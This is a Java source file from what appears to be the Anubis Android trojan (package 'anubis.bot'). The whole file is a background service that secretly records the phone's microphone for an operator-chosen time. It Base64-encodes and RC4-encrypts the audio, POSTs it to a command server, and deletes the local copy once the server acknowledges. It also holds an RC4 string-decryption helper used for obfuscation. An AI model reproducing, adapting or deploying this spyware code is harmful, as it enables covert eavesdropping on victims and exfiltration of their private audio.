package anubis.bot.myapplication.API.Sound;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;
import android.media.MediaRecorder;
import android.util.Base64;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class ServiceRecordSound extends IntentService {
 boolean startRecord = false;
 UtilsClass utilsClass = new UtilsClass();
 String   filePrefix;

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    public ServiceRecordSound() {
        super("ServiceRecordSound");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        utilsClass.SetWrite(this,"startRecordSound","start");
        try {
            int timeInt = Integer.parseInt(intent.getStringExtra("time"));
            if(timeInt>0){
                DateFormat df = new SimpleDateFormat("MM-dd-yyyy_HH:mm:ss", Locale.US);
                String SetTimeString = df.format(Calendar.getInstance().getTime());
                String namefile = "/RecordSound_"+SetTimeString+".amr";
                filePrefix = getExternalFilesDir(null) + namefile;// + SetTimeString;
                utilsClass.Log("FILE REC",""+filePrefix);
                utilsClass.Log("Time",""+timeInt);
                recordAudio(this, filePrefix ,namefile, timeInt);
            }
        }catch (Exception ex){
            utilsClass.SetWrite(this,"startRecordSound","stop");
            utilsClass.Log("ServiceRecordSound","ERROR" + ex);

        }
    }


    void recordAudio(final Context cont, final String file, final String namefile, final int time) {
        final MediaRecorder recorder = new MediaRecorder();


        Log.e("SOUND", "START RECORD SOUND");
        startRecord = false;
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(file);

        Thread timer = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(time * 1000);
                } catch (InterruptedException e) {
                    utilsClass.SetWrite(cont,"startRecordSound","stop");
                } finally {
                    utilsClass.Log("SOUND","STOP RECORD SOUND");
                    try {
                        recorder.stop();
                        recorder.release();

                        utilsClass.Log("FILE",""+file);

                        byte[] bytefile = utilsClass.loadFile(new File(file));
                        String encoded = Base64.encodeToString(bytefile, Base64.DEFAULT);

                        String responce =  utilsClass.trafDeCr(utilsClass.POST(cont,"13","p="+ utilsClass.trafEnCr(namefile + "||:||"+encoded)));
                        utilsClass.Log("Запрос", " - > " + responce);
                        if(responce.equals("**good**")){
                            File file1 = new File(file);
                            file1.delete();
                        }
                        utilsClass.SetWrite(cont,"startRecordSound","stop");
                    }catch (Exception ex){
                        utilsClass.SetWrite(cont,"startRecordSound","stop");
                        utilsClass.Log("ERROR","Record Sound! " + ex);
                        return;
                    }

                }
            }
        });


        try {
            recorder.prepare();
            recorder.start();
            timer.start();
        } catch (IOException e) {}
    }
}
